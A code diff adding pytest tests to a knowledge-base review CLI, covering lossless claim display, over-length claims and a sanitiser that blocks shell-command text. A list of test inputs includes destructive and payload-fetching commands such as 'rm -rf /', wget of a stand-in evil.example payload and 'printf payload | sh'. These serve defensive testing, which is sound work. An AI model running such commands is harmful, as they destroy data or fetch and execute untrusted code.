@@ -1598,6 +1598,50 @@ def test_kb_review_shows_each_verified_claim_and_verbatim_evidence_not_scaffold_
     assert protocol["next_actions"][0]["records"] == [record]
 
 
+def test_public_review_projection_keeps_same_prefix_claim_tails_distinguishable(tmp_path: Path) -> None:
+    kb = _load_kb_cli()
+    shared_prefix = "共同的已核验判断前缀" * 30
+    records = []
+    for suffix in ("第一条结论的不同尾部。", "第二条结论的不同尾部。"):
+        record = _pending_record(f"p-lossless-{len(records)}-123456", "paper", "Lossless")
+        record["payload"]["claims"][0]["text"] = shared_prefix + suffix
+        records.append(record)
+
+    projections = [kb.public_review_projection(record, tmp_path) for record in records]
+
+    assert [projection["status"] for projection in projections] == ["ready", "ready"]
+    visible_texts = [projection["claims"][0]["text"] for projection in projections]
+    assert visible_texts == [record["payload"]["claims"][0]["text"] for record in records]
+    assert visible_texts[0] != visible_texts[1]
+
+
+def test_over_cap_review_claim_routes_to_safe_explanation_without_truncating_ready_text(
+    monkeypatch,
+    tmp_path: Path,
+    capsys,
+) -> None:
+    kb = _load_kb_cli()
+    record = _pending_record("p-over-cap-123456", "paper", "Over Cap")
+    raw_claim = "长" * (kb._PUBLIC_CLAIM_TEXT_HARD_CAP + 1)
+    record["payload"]["claims"][0]["text"] = raw_claim
+    monkeypatch.setattr(
+        kb,
+        "forward_command",
+        lambda root, relative_script, args, *, stream=True: kb.CommandResult((relative_script, *args), 0),
+    )
+    monkeypatch.setattr(kb, "load_review_records", lambda root, fuzzy: [record])
+    monkeypatch.setattr(kb, "is_ready_for_human_review", lambda candidate: True)
+
+    assert kb.main(["--root", str(tmp_path), "--agent-protocol", "over-cap-review.json", "review"]) == 0
+
+    output = capsys.readouterr().out
+    assert output == "目前没有可供你安全确认的判断；请先让 Agent 安全解释这些已核验内容。\n"
+    assert "…" not in output
+    protocol = json.loads((tmp_path / "kb" / ".runtime" / "over-cap-review.json").read_text(encoding="utf-8"))
+    assert protocol["details"]["blocked_review_records"][0]["payload"]["claims"][0]["text"] == raw_claim
+    assert protocol["next_actions"][0]["action"] == "explain_review_items_safely"
+
+
 def test_kb_review_keeps_ready_fact_tracks_without_claims_or_evidence(
     monkeypatch,
     tmp_path: Path,
@@ -1943,12 +1987,22 @@ def test_kb_find_sanitizes_multiline_commands_controls_and_long_values(
     "dangerous",
     [
         "rm -rf /",
+        'rm "-rf" /',
         "curl https://evil.example",
         "git status",
         "git clean -fdx",
         "wget https://evil.example/payload",
         "bash -c id",
+        'bash "-c" "id"',
         "sudo reboot",
+        "printf payload | sh",
+        "printf payload | /bin/sh",
+        "reboot",
+        "pip install attacker-package",
+        "node exploit.js",
+        "open /Applications/Calculator.app",
+        "/tmp/unknown-executable --run",
+        "/usr/bin/bash -c id",
         "$(id)",
     ],
 )
@@ -1964,9 +2018,22 @@ def test_public_display_text_rejects_shell_commands_and_substitution(
 def test_public_display_text_allows_natural_chinese_technical_text_and_kb_pseudo_cli(tmp_path: Path) -> None:
     kb = _load_kb_cli()
     statement = "Git 使用内容寻址存储，适合保留研究过程中的版本历史。"
+    multiline_prose = "普通技术摘要。\nWe find evidence that the method works.\nDocker containers isolate workloads."
 
     assert kb._public_display_text(statement, tmp_path, "安全占位", 120) == statement
     assert kb._public_display_text("kb review", tmp_path, "安全占位", 120) == "kb review"
+    assert kb._public_display_text(multiline_prose, tmp_path, "安全占位", 200) == (
+        "普通技术摘要。 We find evidence that the method works. Docker containers isolate workloads."
+    )
+
+
+def test_public_display_text_fails_closed_on_unclosed_quote_in_command_shape(tmp_path: Path) -> None:
+    kb = _load_kb_cli()
+
+    assert kb._public_display_text('bash "-c" "id', tmp_path, "安全占位", 120) == "安全占位"
+    assert kb._public_display_text("The method's evidence remains intact.", tmp_path, "安全占位", 120) == (
+        "The method's evidence remains intact."
+    )
 
 
 def test_shell_command_in_review_claim_routes_to_safe_explanation(
